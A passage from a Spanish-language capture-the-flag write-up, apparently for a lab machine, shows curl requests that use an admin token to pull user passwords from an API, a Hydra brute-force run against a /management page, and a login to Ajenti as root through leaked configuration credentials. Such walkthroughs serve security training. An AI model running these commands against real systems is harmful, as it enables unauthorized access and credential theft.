+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ curl -s -X GET http://10.129.96.55:3000/users -H <span style="color:#e6db74">&#39;Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzIyODg0MDU2LCJleHAiOjE3MjI5NzA0NTZ9.FyEpFhkz8V0rIXmjcegdmvZ2sXIdPO-OMdVa6OD0C_Y&#39;</span> | jq
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;ID&#34;</span>: <span style="color:#e6db74">&#34;1&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;Admin&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Role&#34;</span>: <span style="color:#e6db74">&#34;Superuser&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;ID&#34;</span>: <span style="color:#e6db74">&#34;2&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;Derry&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Role&#34;</span>: <span style="color:#e6db74">&#34;Web Admin&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;ID&#34;</span>: <span style="color:#e6db74">&#34;3&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;Yuri&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Role&#34;</span>: <span style="color:#e6db74">&#34;Beta Tester&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;ID&#34;</span>: <span style="color:#e6db74">&#34;4&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;Dory&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Role&#34;</span>: <span style="color:#e6db74">&#34;Supporter&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>Otro comportamiento extraño es que podemos indicar un usuario, esto es común, pero se nos devuelve una contraseña&hellip;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ curl -s -X GET http://10.129.96.55:3000/users/dory -H <span style="color:#e6db74">&#39;Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzIyODg0MDU2LCJleHAiOjE3MjI5NzA0NTZ9.FyEpFhkz8V0rIXmjcegdmvZ2sXIdPO-OMdVa6OD0C_Y&#39;</span> | jq
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;Dory&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;password&#34;</span>: <span style="color:#e6db74">&#34;5y:!xa=ybfe)/QD&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>Vamos a recopilar estas credenciales&hellip;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ <span style="color:#66d9ef">for</span> user in <span style="color:#66d9ef">$(</span>cat users.txt<span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span> curl -s -X GET http://10.129.96.55:3000/users/$user -H <span style="color:#e6db74">&#39;Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzIyODg0MDU2LCJleHAiOjE3MjI5NzA0NTZ9.FyEpFhkz8V0rIXmjcegdmvZ2sXIdPO-OMdVa6OD0C_Y&#39;</span> | jq; <span style="color:#66d9ef">done</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;Admin&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;password&#34;</span>: <span style="color:#e6db74">&#34;WX5b7)&gt;/rp</span>$U<span style="color:#e6db74">)FW&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;Derry&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;password&#34;</span>: <span style="color:#e6db74">&#34;rZ86wwLvx7jUxtch&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;Yuri&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;password&#34;</span>: <span style="color:#e6db74">&#34;bet@tester87&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;Dory&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;password&#34;</span>: <span style="color:#e6db74">&#34;5y:!xa=ybfe)/QD&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><h1 id="foothold">Foothold</h1>
+<p>Ahora teniendo una lista de usuarios y credenciales, podemos probar a autenticarnos en <code>/management</code> o entrar en el Ajenti.</p>
+<p>Fijándonos en <a href="http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/">este</a> post&hellip;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ hydra -L users.txt -P credentials.txt -s <span style="color:#ae81ff">80</span> -f 10.129.96.55 http-get /managementHydra v9.4 <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2022</span> by van Hauser/THC &amp; David Maciejak - Please <span style="color:#66d9ef">do</span> not use in military or secret service organizations, or <span style="color:#66d9ef">for</span> illegal purposes <span style="color:#f92672">(</span>this is non-binding, these *** ignore laws and ethics anyway<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> starting at 2024-08-05 23:02:21
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> max <span style="color:#ae81ff">16</span> tasks per <span style="color:#ae81ff">1</span> server, overall <span style="color:#ae81ff">16</span> tasks, <span style="color:#ae81ff">16</span> login tries <span style="color:#f92672">(</span>l:4/p:4<span style="color:#f92672">)</span>, ~1 try per task
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> attacking http-get://10.129.96.55:80/management
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>80<span style="color:#f92672">][</span>http-get<span style="color:#f92672">]</span> host: 10.129.96.55   login: Derry   password: rZ86wwLvx7jUxtch
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>STATUS<span style="color:#f92672">]</span> attack finished <span style="color:#66d9ef">for</span> 10.129.96.55 <span style="color:#f92672">(</span>valid pair found<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> target successfully completed, <span style="color:#ae81ff">1</span> valid password found
+</span></span><span style="display:flex;"><span>Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> finished at 2024-08-05 23:02:22
+</span></span></code></pre></div><p>Y al acceder a <code>/management</code> vemos un hipervínculo hacia <code>/management/config.json</code>
+<img src="images/Screenshot_7.png" alt="Write-up Image"></p>
+<p>Vemos unas credenciales justo debajo de lo que parece ser la configuración del <code>Ajenti</code></p>
+<p>Buscando en Google vemos que por defecto, en <code>Ajenti</code> el usuario administrador se llama <code>root</code></p>
+<p>Así que probando <code>root:KpMasng6S5EtTy9Z</code>
+<img src="images/Screenshot_8.png" alt="Write-up Image"></p>
+<p>Antes de probar ningún exploit, vemos un apartado <code>Terminal</code> donde podemos crear una supuesta consola..
+<img src="images/Screenshot_9.png" alt="Write-up Image"></p>
+<p>Veo que estoy en la máquina víctima (no hay ningún contenedor) y que encima estoy ejecutando comandos como <code>root</code>
+<img src="images/Screenshot_10.png" alt="Write-up Image"></p>
+<p>Y ya podríamos leer las flags. dos por el precio de una.
+<img src="images/Screenshot_11.png" alt="Write-up Image"></p>
+<p>¡Y ya estaría!</p>
+<p>Happy Hacking! 🚀</p>
+
+    </div>
+
+    
+
+            </div>
+        </div><footer class="text-center pb-1">
+    <small class="text-muted">
+        
+            &copy; 2024, Andrés Del Cerro
+        
+        <br>
+        Powered by <a href="https://gohugo.io/" target="_blank">Hugo</a>
+        and <a href="https://github.com/austingebauer/devise" target="_blank">Devise</a>
+    </small>
+</footer>
+</body>
+</html>
